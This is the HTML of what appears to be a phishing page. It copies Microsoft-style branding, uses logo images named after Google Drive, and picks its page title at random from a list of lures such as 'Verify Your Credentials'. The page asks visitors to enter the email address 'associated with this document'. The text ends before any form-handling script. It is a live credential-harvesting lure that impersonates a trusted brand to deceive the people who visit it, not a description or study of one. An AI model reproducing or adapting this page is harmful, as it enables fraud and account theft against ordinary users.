<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        // Titles array with different variations
        const titles = [
            "Confirm Your Identity",
            "Identity Confirmation Required",
            "Secure Your Access",
            "Verify Your Credentials",
            "Confirm Your Account",
            "Identity Check",
            "Verify Your Details",
            "Authenticate Your Identity",
            "Identity Verification Needed",
            "Confirm Your Personal Information"
        ];

        // Function to select a random title
        function setRandomTitle() {
            const randomIndex = Math.floor(Math.random() * titles.length);
            document.title = titles[randomIndex];
        }

        // Set random title on page load
        window.onload = setRandomTitle;
    </script>
    
    <!-- Add favicon (Microsoft logo) -->
    <link rel="icon" type="image/png" href="https://storage.googleapis.com/assets_workspace/uploads/7uffzv9dk4sn-3652TCzauH9jaL0QJ8H6FM-bfed64c7e8da9ac20d439f436570f955-Drive_Full_Logo_2x.svg">
    
    <style>
        body {
            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
            background-image: url(''); /* Add your background image here */
            background-size: cover;
            background-position: center;
        }

        .header {
            width: 100%;
            background-color: #0078d4;
            color: white;
            text-align: left;
            padding: 10px 20px;
            box-sizing: border-box;
            font-size: 18px;
            position: absolute;
            top: 0;
        }

        .header span {
            margin-left: 20px;
        }

        .container {
            background-color: white;
            border: 1px solid #ccc;
            border-radius: 3px;
            padding: 33px;
            width: 80%;
            max-width: 300px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            margin-top: 0px;
        }

        .container img {
            width: 100px;
            margin-bottom: 20px;
        }

        .container h2 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #333;
        }

        .container p {
            margin-bottom: 10px;
            color: #666;
        }

        .container input[type="email"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 3px;
            font-size: 16px;
            box-sizing: border-box;
            text-align: center;
        }

        .container button {
            width: 100%;
            padding: 10px;
            background-color: #0078d4;
            color: white;
            border: none;
            border-radius: 3px;
            font-size: 16px;
            cursor: pointer;
        }

        .container button:hover {
            background-color: #005a9e;
        }

        .container .footer {
            font-size: 12px;
            color: #888;
            margin-top: 20px;
        }

        @media (max-width: 600px) {
            .container {
                padding: 20px;
            }

            .container h2 {
                font-size: 20px;
            }

            .container input[type="email"] {
                font-size: 14px;
            }

            .container button {
                font-size: 14px;
            }
        }

        /* Full-screen loading overlay */
        #loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.8);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        #loading-circle {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://storage.googleapis.com/assets_workspace/uploads/7uffzv9dk4sn-3652TCzauH9jaL0QJ8H6FM-bfed64c7e8da9ac20d439f436570f955-Drive_Full_Logo_2x.svg" style="width: 10%; height: auto;" alt="soft Logo">

    </div>

    <div class="container">
        <img src="https://storage.googleapis.com/assets_workspace/uploads/7uffzv9dk4sn-3652TCzauH9jaL0QJ8H6FM-bfed64c7e8da9ac20d439f436570f955-Drive_Full_Logo_2x.svg" style="width: 65%; height: auto;" alt="soft Logo">

<p>To proceed, we need to confirm your email address. Please enter the email address associated with this document.</p>


        <input type="email" id="email-input" placeholder="Enter email" required="" style="margin-top: 10px;">
        
        <!-- Error message element -->
        <p id="error-message" style="color: red; display: none;"></p>
        
        <button id="continue-button">NEXT</button>
    </div>

    <!-- Full-screen loading overlay -->
    <div id="loading-overlay">
        <div id="loading-circle"></div>
    </div>
